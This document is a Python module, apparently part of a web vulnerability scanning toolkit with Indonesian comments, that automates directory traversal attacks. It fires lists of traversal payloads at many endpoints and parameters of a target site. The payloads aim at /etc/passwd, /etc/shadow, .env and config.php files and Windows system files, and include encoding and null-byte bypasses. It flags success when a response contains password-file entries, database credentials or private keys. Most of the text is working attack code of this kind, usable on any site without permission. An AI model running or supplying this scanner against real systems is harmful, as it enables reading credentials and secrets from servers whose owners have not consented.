#!/usr/bin/env python3
"""
Module 13: Directory Traversal Scanner
4 Layer path traversal detection | Waktu: 3-5 menit total | Akurasi: 90%
"""

import asyncio
import urllib.parse
from typing import List, Dict, Optional
from core.http_client import HTTPClient
from core.logger import Logger

logger = Logger()

class DirTraversalScanner:
    def __init__(self, target: str, threads: int = 60, timeout: int = 3):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.findings: List[Dict] = []
        self.stats = {
            'endpoints_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0
        }
        
        # ============ PARAMETERS (15 parameter - dikurangi) ============
        self.traversal_params = [
            'file', 'path', 'dir', 'folder', 'document', 'page', 'load',
            'include', 'view', 'filename', 'image', 'img', 'download', 'read', 'open'
        ]
        
        # ============ ENDPOINTS (10 endpoint - dikurangi) ============
        self.test_endpoints = [
            "/", "/download", "/file", "/image", "/view",
            "/include", "/load", "/read", "/api/download", "/assets"
        ]
        
        # ============ CRITICAL PAYLOADS (20 payload - prioritas) ============
        self.critical_payloads = [
            # Linux (yang paling sering ditemukan)
            '../../../../etc/passwd',
            '../../../etc/passwd',
            '../../etc/passwd',
            '../../../../etc/hosts',
            '../../../../etc/shadow',
            '../../../../etc/group',
            '../../../../var/www/html/.env',
            '../../../../var/www/html/config.php',
            # Windows
            '../../../../Windows/win.ini',
            '../../../Windows/win.ini',
            '../../../../Windows/System32/drivers/etc/hosts',
            '../../../../boot.ini',
            # Null byte
            '../../../../etc/passwd%00',
            '../../../../Windows/win.ini%00',
        ]
        
        # ============ BYPASS PAYLOADS (10 payload) ============
        self.bypass_payloads = [
            '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..\\..\\..\\..\\windows\\win.ini',
            '....\\....\\....\\windows\\win.ini',
            '/etc/passwd',
            'file:///etc/passwd',
            '../../../../etc/passwd?',
            '../../../../etc/passwd#',
        ]
        
        # ============ SUCCESS INDICATORS ============
        self.success_indicators = [
            'root:', 'daemon:', 'bin:', 'nobody:', '/bin/bash',
            '[extensions]', '[fonts]', 'DB_HOST', 'DB_USER',
            'BEGIN RSA PRIVATE KEY', '127.0.0.1 localhost'
        ]
    
    async def test_traversal(self, endpoint: str, param: str, payload: str, platform: str) -> Optional[Dict]:
        """Test path traversal - DIPERCEPAT"""
        
        async with HTTPClient(self.target, timeout=self.timeout, retries=1) as client:
            url = f"{endpoint}?{param}={urllib.parse.quote(payload, safe='')}"
            
            try:
                response = await client.get(url)
                
                if response and response.status == 200:
                    response_text = await response.text()
                    body = response_text.lower() if response_text else ""
                    
                    for indicator in self.success_indicators:
                        if indicator.lower() in body:
                            # False positive check
                            fp_keywords = ['not found', 'no such file', 'access denied', 'error']
                            is_fp = any(fp in body for fp in fp_keywords)
                            
                            if not is_fp and len(body) > 100:
                                severity = "critical" if 'passwd' in payload or 'shadow' in payload else "high"
                                
                                return {
                                    "vulnerable": True,
                                    "type": "DIRECTORY_TRAVERSAL",
                                    "severity": severity,
                                    "confidence": 95,
                                    "endpoint": endpoint,
                                    "parameter": param,
                                    "payload": payload[:80],
                                    "platform": platform,
                                    "indicator": indicator,
                                    "response_snippet": body[:300]
                                }
            except:
                pass
        
        return None
    
    async def scan_endpoint(self, endpoint: str, param: str) -> List[Dict]:
        """Scan single endpoint - DIPERCEPAT"""
        
        findings = []
        semaphore = asyncio.Semaphore(self.threads)
        
        async def test_payload(payload: str, platform: str):
            async with semaphore:
                result = await self.test_traversal(endpoint, param, payload, platform)
                if result:
                    findings.append(result)
                    self.stats['vulnerabilities_found'] += 1
                    icon = "💎" if result.get('severity') == 'critical' else "🔴"
                    logger.finding(
                        f"{icon} Directory Traversal on {endpoint} via {param}",
                        f"Payload: {payload[:60]}"
                    )
                    return True
            return False
        
        # Test critical payloads first (prioritas)
        for payload in self.critical_payloads:
            self.stats['payloads_tested'] += 1
            found = await test_payload(payload, "Linux" if 'etc' in payload else "Windows")
            if found:
                return findings
        
        # Test bypass payloads
        for payload in self.bypass_payloads:
            self.stats['payloads_tested'] += 1
            found = await test_payload(payload, "Linux")
            if found:
                return findings
        
        return findings
    
    async def scan(self, custom_endpoints: List[str] = None, custom_params: List[str] = None) -> Dict:
        """Full directory traversal scanner"""
        
        if custom_endpoints:
            endpoints = custom_endpoints
        else:
            endpoints = self.test_endpoints
        
        if custom_params:
            params = custom_params
        else:
            params = self.traversal_params
        
        total_tests = len(endpoints) * len(params) * (len(self.critical_payloads) + len(self.bypass_payloads))
        
        logger.info(f"\n{'='*60}")
        logger.info(f"🚀 DRYBT - DIRECTORY TRAVERSAL SCANNER")
        logger.info(f"{'='*60}")
        logger.info(f"🎯 Target: {self.target}")
        logger.info(f"📡 Endpoints: {len(endpoints)}")
        logger.info(f"📊 Parameters: {len(params)}")
        logger.info(f"📈 Payloads: {len(self.critical_payloads) + len(self.bypass_payloads)}")
        logger.info(f"📊 Total tests: {total_tests:,}")
        logger.info(f"🔧 Threads: {self.threads} | Timeout: {self.timeout}s")
        logger.info(f"⏱️  Estimated time: 3-5 minutes")
        logger.info(f"{'='*60}\n")
        
        start_time = asyncio.get_event_loop().time()
        
        for endpoint in endpoints:
            logger.info(f"\n📡 Testing: {endpoint}")
            endpoint_start = asyncio.get_event_loop().time()
            
            for param in params:
                findings = await self.scan_endpoint(endpoint, param)
                self.findings.extend(findings)
                self.stats['endpoints_tested'] += 1
                if findings:
                    logger.info(f"  ✅ Found via: {param}")
                await asyncio.sleep(0.01)
            
            endpoint_elapsed = asyncio.get_event_loop().time() - endpoint_start
            logger.info(f"  ✅ Done: {endpoint} - {endpoint_elapsed:.1f}s | {len([f for f in self.findings if f.get('endpoint') == endpoint])} findings")
        
        elapsed = asyncio.get_event_loop().time() - start_time
        
        critical_findings = [f for f in self.findings if f.get('severity') == 'critical']
        high_findings = [f for f in self.findings if f.get('severity') == 'high']
        
        print(f"\n{'='*60}")
        print(f"📊 DIRECTORY TRAVERSAL SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"⏱️  Time: {elapsed:.2f}s ({elapsed/60:.1f}m)")
        print(f"📡 Endpoints: {self.stats['endpoints_tested']}")
        print(f"📊 Payloads: {self.stats['payloads_tested']}")
        print(f"🎯 Findings: {len(self.findings)}")
        
        if critical_findings:
            print(f"\n💎 CRITICAL VULNERABILITIES:")
            for f in critical_findings[:10]:
                print(f"   🔥 {f['parameter']} | {f.get('payload', '')[:50]}")
        
        if high_findings:
            print(f"\n🔴 HIGH VULNERABILITIES:")
            for f in high_findings[:10]:
                print(f"   ⚡ {f['parameter']} | {f.get('payload', '')[:50]}")
        
        print(f"\n{'='*60}")
        
        rating = "💎 CRITICAL - System files exposed!" if critical_findings else \
                 "🔴 HIGH - Local File Inclusion detected" if high_findings else \
                 "✅ SECURE - No directory traversal detected"
        
        print(f"📈 Result: {rating}")
        print(f"{'='*60}\n")
        
        return {
            "module": "dir_traversal",
            "mode": "balanced",
            "target": self.target,
            "scan_time_minutes": round(elapsed/60, 1),
            "endpoints_tested": self.stats['endpoints_tested'],
            "payloads_tested": self.stats['payloads_tested'],
            "vulnerabilities_found": len(self.findings),
            "critical_vulnerabilities": len(critical_findings),
            "high_vulnerabilities": len(high_findings),
            "findings": self.findings
        }
    
    @staticmethod
    async def run(target: str, custom_endpoints: List[str] = None, custom_params: List[str] = None) -> Dict:
        """Run directory traversal scanner"""
        scanner = DirTraversalScanner(target)
        return await scanner.scan(custom_endpoints, custom_params)